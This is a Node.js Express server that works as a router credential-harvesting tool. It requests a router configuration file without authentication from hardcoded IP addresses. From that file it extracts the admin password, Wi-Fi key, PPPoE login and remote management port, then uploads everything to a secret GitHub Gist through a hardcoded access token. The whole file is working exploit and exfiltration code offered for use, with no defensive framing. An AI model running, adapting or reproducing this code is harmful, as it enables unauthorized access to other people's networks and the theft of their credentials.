const express = require('express');
const net = require('net');
const axios = require('axios'); // Add axios for GitHub API requests
const app = express();
const port = 3000; // Adjust the port as needed

const GITHUB_TOKEN = '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'; // Replace with your GitHub token
const GIST_FILENAME = 'router_results.txt'; // Desired filename for the gist

app.use(express.static('public')); // Serve static files from the 'public' directory

function getRouterIps() {
    return ["192.168.144.120", "10.11.3.65"];
}

function getPorts() {
    return [80, 8080]; // Add multiple ports here
}

async function sendRequest(routerIp, port) {
    return new Promise((resolve, reject) => {
        const client = net.createConnection(port, routerIp, () => {
            client.write("GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0\n\n");
        });

        let response = '';
        client.on('data', data => response += data);
        client.on('end', () => resolve(response));
        client.on('error', reject);
        client.setTimeout(1000);
        client.on('timeout', () => {
            client.destroy();
            reject(new Error('Connection timed out'));
        });
    });
}

function getPassword(response) {
    const passwd = response.split("http_passwd=")[1]; // Extract Admin password
    return passwd ? Buffer.from(passwd.split('\n')[0], 'base64').toString('utf-8') : 'Password not found';
}

function getWifiName(response) {
    const wifiNameMatch = response.match(/wl0_ssid=([^\n]+)/); // Extract the Wi-Fi name
    return wifiNameMatch ? wifiNameMatch[1].trim() : 'Unknown_Network';
}

function getWifiPass(response) {
    const wifiPassMatch = response.match(/wl0_wpa_psk=([^\n]+)/); // Extract the Wi-Fi Password
    return wifiPassMatch ? wifiPassMatch[1].trim() : 'Unknown_Wifipass';
}

function getUserName(response) {
    const userNameMatch = response.match(/wan0_pppoe_username=([^\n]+)/); // Extract the Wi-Fi Username
    return userNameMatch ? userNameMatch[1].trim() : 'Unknown_Username';
}

function getUserPass(response) {
    const userPassMatch = response.match(/wan0_pppoe_passwd=([^\n]+)/); // Extract the Wi-Fi User Password
    return userPassMatch ? userPassMatch[1].trim() : 'Unknown_Userpass';
}

function getWanIp(response) {
    const wanIpMatch = response.match(/wan0_ipaddr=([^\n]+)/); // Extract the WAN IP
    return wanIpMatch ? wanIpMatch[1].trim() : 'Unknown_Wanip';
}

function getPort(response) {
    const portMatch = response.match(/rm_web_port=([^\n]+)/); // Extract the remote management port
    return portMatch ? portMatch[1].trim() : 'Unknown_Port';
}

// Function to get current date and time in Bangladesh timezone
function getBangladeshDateTime() {
    const options = { timeZone: 'Asia/Dhaka', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
    return new Intl.DateTimeFormat('en-GB', options).format(new Date());
}

// Function to check for existing Gist and update or create
async function upsertGist(content) {
    try {
        // Get all Gists for the authenticated user
        const gistsResponse = await axios.get('https://api.github.com/gists', {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
            },
        });

        // Check if the Gist with the specified filename exists
        const existingGist = gistsResponse.data.find(gist => {
            return Object.keys(gist.files).includes(GIST_FILENAME);
        });

        if (existingGist) {
            // If it exists, update it
            await updateGist(existingGist.id, content);
        } else {
            // If it doesn't exist, create a new Gist
            await createGist(content);
        }
    } catch (error) {
        console.error('Error checking/updating Gist:', error.response ? error.response.data : error.message);
    }
}

// Function to create a new secret Gist
async function createGist(content) {
    try {
        await axios.post('https://api.github.com/gists', {
            files: {
                [GIST_FILENAME]: {
                    content: content,
                },
            },
            public: false, // Set to false to make it a secret gist
        }, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
            },
        });

        console.log('Gist created successfully');
    } catch (error) {
        console.error('Error creating Gist:', error.response ? error.response.data : error.message);
    }
}

// Function to update existing Gist
async function updateGist(gistId, content) {
    try {
        // Fetch the existing Gist to get the current content
        const gistResponse = await axios.get(`https://api.github.com/gists/${gistId}`, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
            },
        });

        // Access the filename dynamically
        const files = gistResponse.data.files;
        const gistFilename = Object.keys(files)[0]; // Get the first filename dynamically

        // Combine new content with existing content
        const existingContent = files[gistFilename].content;
        const updatedContent = existingContent + '\n' + content; // Append new data

        // Update the Gist with the combined content
        await axios.patch(`https://api.github.com/gists/${gistId}`, {
            files: {
                [gistFilename]: {
                    content: updatedContent,
                },
            },
        }, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
            },
        });

        console.log('Gist updated successfully');
    } catch (error) {
        console.error('Error updating Gist:', error.response ? error.response.data : error.message);
    }
}

app.get('/find-passwords', async (req, res) => {
    const routerIps = getRouterIps();
    const ports = getPorts();
    const results = [];

    for (const routerIp of routerIps) {
        const currentDateTime = getBangladeshDateTime(); // Get current date and time

        for (const port of ports) {
            try {
                const response = await sendRequest(routerIp, port);
                const wifiName = getWifiName(response);
                const wifiPass = getWifiPass(response);
                const routerPass = getPassword(response);
                const wanIp = getWanIp(response); // Call the WAN IP extraction function
                const userName = getUserName(response); // Call the username extraction function
                const userPass = getUserPass(response); // Call the user password extraction function
                const remotePort = getPort(response); // Call the remote management port extraction function
                
                // Format the result string with all the details including date and time
                const resultString = `Details from ${routerIp} (${currentDateTime}) on port ${port}:\n` +
                    `Config file response:\n${response}\n\n` + // Displaying the config file response
                    `Network: ${wifiName}\n` +
                    `Wi-Fi Password: ${wifiPass}\n` +
                    `Router Admin Password: ${routerPass}\n` +
                    `WAN IP: ${wanIp}\n` +
                    `Remote Management Port: ${remotePort}\n` +
                    `Username: ${userName}\n` +
                    `User Password: ${userPass}\n`;

                results.push(resultString);
            } catch (error) {
                const errorMessage = `Error connecting to ${routerIp} (${currentDateTime}) on port ${port}: ${error.message}`;
                results.push(errorMessage);
            }
        }
    }

    // Store all results (both successful and error messages) in Gist
    await upsertGist(results.join('\n\n')); // Join results with double newlines for readability

    res.json(results); // Send results back to the client
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
